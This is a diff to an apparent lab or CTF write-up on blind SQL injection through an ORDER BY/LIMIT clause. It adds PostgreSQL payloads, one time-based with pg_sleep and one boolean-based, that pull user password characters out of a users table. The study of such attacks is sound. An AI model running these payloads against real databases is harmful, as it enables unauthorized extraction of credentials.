@@ -26,7 +26,20 @@ With the payload above, the logic is: If the string is true, the order will filt
 
 In the **exploit.py**, we filter the first occurrence of <td> that contains the result. If it's Aaron, this means that the order is filtered by Name and we found the character.
 
-The author exploit uses, since the content-length differ from "order by 1" and "order by 2".
+<br>
+
+The author's exploit uses this payload, since the content-length differ from "order by 1" and "order by 2".
 ```
 sqli = "2 LIMIT (CASE WHEN (%s) THEN 1 ELSE 2 END)"
 ```
+
+Exploit from 0x4rt3mis:
+```
+Time based:
+SELECT CASE WHEN COUNT((SELECT password FROM users WHERE SUBSTR(password,1,1) SIMILAR TO '4'))<>0 THEN pg_sleep(5) ELSE '' END; -- -
+
+Boolean based:
+4 LIMIT (CASE WHEN (SUBSTR((SELECT password FROM users WHERE user_id=1),1,1))='4' THEN 1 ELSE 2 END)
+```
+
+Reference: https://www.onsecurity.io/blog/pentesting-postgresql-with-sql-injections/
